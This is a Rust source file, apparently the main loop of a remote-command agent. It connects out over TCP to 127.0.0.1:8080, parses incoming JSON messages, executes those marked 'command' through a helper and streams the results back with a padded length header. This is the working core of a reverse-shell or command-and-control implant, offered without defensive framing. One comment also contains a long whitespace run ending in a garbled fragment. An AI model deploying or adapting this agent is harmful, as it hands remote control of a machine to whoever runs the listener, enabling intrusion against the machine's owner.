#![allow(unused_imports)]
#![allow(dead_code)]
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;
use serde_json::Result;
use tokio::{io::*, process::*, sync::*, *};
mod comm;
mod funcs;


#[tokio::main]
async fn main() {

    // Buff for socket
    let mut buff = [0;1024];
    // Tokio create connection
    let mut stream: tokio::net::TcpStream = TcpStream::connect("127.0.0.1:8080").await.unwrap();
    


    // Keep accepting data and do stuff with it                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         uff with is
    loop{
        
        let n: usize = stream.read(&mut buff).await.unwrap();
        let (tx, mut rx) = mpsc::channel::<comm::MyProto>(32);

        // Convert JSON to struct
        let my_data: comm::MyProto = serde_json::from_str(std::str::from_utf8( &mut buff[..n]).unwrap()).unwrap();
        
        match my_data.message_type.as_str() { 

            // Message type is command so run the command
            "command" => {
                funcs::run_command(my_data, tx).await;
   
            }, 
            //Unknown Message type     
            _ => {
                let output_data: comm::MyProto = comm::MyProto{
                data: "Error: Unknown message_type".to_string(),
                message_type: "Error".to_string(),
                channel: "1".to_string()};

                match tx.send(output_data).await{
                    Ok(()) => {},
                    Err(err) => panic!("Channel Broken: {}", err)
                    }
        
                }
            };

        let message = rx.recv().await.unwrap();
        
        match message.data.as_str() {
            "" => {},
            _ => {
                
                let mut reply_data = serde_json::to_string(&message).unwrap();
                
                
                

                let len_msg = comm::MyProto{
                    data: reply_data.len().to_string(),
                    message_type: "message_size".to_string(),
                    channel: "1".to_string()};

                let mut len_data = serde_json::to_string(&len_msg).unwrap();
                let n = 1024 - len_data.len();
                len_data.push_str(&String::from_utf8(vec![b'0';n]).unwrap());
                
                stream.write(len_data.as_bytes()).await.unwrap();
                stream.write(reply_data.as_bytes()).await.unwrap();
                }
            }      
                
            
        }
}